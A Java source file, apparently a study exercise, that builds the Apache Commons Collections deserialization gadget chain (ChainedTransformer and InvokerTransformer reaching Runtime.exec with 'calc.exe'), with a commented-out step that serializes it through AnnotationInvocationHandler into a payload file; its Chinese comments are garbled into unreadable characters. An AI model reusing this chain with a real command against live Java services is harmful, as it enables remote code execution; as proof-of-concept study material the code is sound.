package fanxulie;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class fanxulie5 {

	public static void main(String[] args) throws Exception {
	    //transformers: һ��transformer������������transformer����Ԥ��ת���߼�����ת������
	    Transformer[] transformers = new Transformer[] {
	        new ConstantTransformer(Runtime.class),
	        new InvokerTransformer("getMethod", 
	            new Class[] {String.class, Class[].class }, new Object[] {
	            "getRuntime", new Class[0] }),
	        new InvokerTransformer("invoke", 
	            new Class[] {Object.class, Object[].class }, new Object[] {
	            null, new Object[0] }),
	        new InvokerTransformer("exec", 
	            new Class[] {String.class }, new Object[] {"calc.exe"})};

	    //���ȹ���һ��Map��һ���ܹ�ִ�д����ChainedTransformer���Դ�����һ��TransformedMap
	    Transformer transformedChain = new ChainedTransformer(transformers);
//	    transformedChain.transform('1');
	    Map innerMap = new HashMap();
	    innerMap.put("1", "zhang");

	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
	    //����Map�е�MapEntry�����޸ģ�����setValue()����
	    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();	    
	    onlyElement.setValue("foobar");
	    /*�������е�setValue()ʱ���ͻᴥ��ChainedTransformer�е�һϵ�б任������
	       ����ͨ��ConstantTransformer���Runtime��
	       ��һ��ͨ���������getMethod�ҵ�invoke����
	       �������������calc.exe��
	    */
	    
////�˴������л�
//        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//
//        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
//        ctor.setAccessible(true);
//        Object instance = ctor.newInstance(Target.class, outerMap);
//
//        File f = new File("qqqqq.bin");
//        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
//        out.writeObject(instance);
//        
//	    
	}

}
